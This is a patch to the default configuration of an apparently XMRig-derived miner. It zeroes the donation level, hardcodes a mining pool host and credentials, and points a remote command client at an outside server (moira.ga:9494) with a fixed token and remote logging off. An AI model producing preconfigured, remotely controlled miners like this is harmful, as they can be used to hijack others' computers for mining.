@@ -1,0 +1,43 @@
+--- src/core/config/Config_default.h.orig
++++ src/core/config/Config_default.h
+@@ -57,19 +57,20 @@
+         "huge-pages": true,
+         "hw-aes": null,
+         "priority": null,
++        "sleep": -1,
+         "asm": true,
+         "argon2-impl": null,
+         "cn/0": false,
+         "cn-lite/0": false
+     },
+-    "donate-level": 5,
++    "donate-level": 0,
+     "log-file": null,
+     "pools": [
+         {
+             "algo": null,
+-            "url": "donate.graef.in:80",
+-            "user": "YOUR_WALLET_ADDRESS",
+-            "pass": "x",
++            "url": "xnp1.service.cluster.consulate.ga",
++            "user": "KnockKnock",
++            "pass": "WhosThere",
+             "rig-id": null,
+             "nicehash": false,
+             "keepalive": false,
+@@ -81,12 +82,12 @@
+     ],
+     "cc-client": {
+         "enabled" : true,
+-        "url": "localhost:3344",
++        "url": "moira.ga:9494",
+         "use-tls" : false,
+-        "access-token": "mySecret",
++        "access-token": "acstkn",
+         "worker-id": null,
+         "update-interval-s": 10,
+-        "use-remote-logging" : true,
++        "use-remote-logging" : false,
+         "upload-config-on-start" : true
+     },
+     "print-time": 60,
